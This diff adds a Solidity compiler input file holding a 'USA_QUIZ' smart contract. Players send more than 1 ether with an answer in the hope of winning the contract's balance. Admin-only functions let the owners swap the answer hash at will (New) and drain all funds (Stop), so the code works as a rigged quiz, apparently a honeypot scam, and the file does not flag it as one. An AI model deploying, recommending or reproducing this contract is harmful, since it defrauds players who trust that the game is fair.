@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "USA_QUIZ.sol": {
+      "content": "contract USA_QUIZ\r\n    {\r\n        function Try(string _response) external payable \r\n        {\r\n            require(msg.sender == tx.origin);\r\n\r\n            if(responseHash == keccak256(_response) && msg.value > 1 ether)\r\n            {\r\n                msg.sender.transfer(this.balance);\r\n            }\r\n        }\r\n\r\n        string public question;\r\n\r\n        bytes32 responseHash;\r\n\r\n        mapping (bytes32=>bool) admin;\r\n\r\n        function Start(string _question, string _response) public payable isAdmin{\r\n            if(responseHash==0x0){\r\n                responseHash = keccak256(_response);\r\n                question = _question;\r\n            }\r\n        }\r\n\r\n        function Stop() public payable isAdmin {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n\r\n        function New(string _question, bytes32 _responseHash) public payable isAdmin {\r\n            question = _question;\r\n            responseHash = _responseHash;\r\n        }\r\n\r\n        constructor(bytes32[] admins) public{\r\n            for(uint256 i=0; i< admins.length; i++){\r\n                admin[admins[i]] = true;        \r\n            }       \r\n        }\r\n\r\n        modifier isAdmin(){\r\n            require(admin[keccak256(msg.sender)]);\r\n            _;\r\n        }\r\n\r\n        function() public payable{}\r\n    }"
+    }
+  }
+}
